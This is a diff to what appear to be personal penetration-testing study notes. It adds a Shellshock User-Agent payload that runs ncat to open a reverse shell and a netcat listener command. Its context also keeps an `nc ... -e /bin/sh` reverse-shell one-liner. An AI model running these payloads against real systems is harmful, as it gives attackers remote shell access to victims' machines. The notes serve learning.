@@ -375,9 +375,15 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
      -O downloads and saves the file with url name
 ```
 
-- We can 
+- We can also use this to open a listening port using the ncat command from the victim machine. This is also called opening a reverse shell script. 
 
+```
+User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'
+```
 
+- But before this command can be run, a listening port must be open on the host
+
+- `ncat -lvp 4444`
 
 
 - **Metasploit COmmands**
@@ -419,7 +425,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 - poping a shell means gaining access to a machine
 
 **Reverse Shell**
--`nc -nvlp 444` attack box (lvp means listening verbose port)
+-`nc -nvlp 4444` attack box (lvp means listening verbose port)
 -`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
 - Whenever a victim connects back to 
 
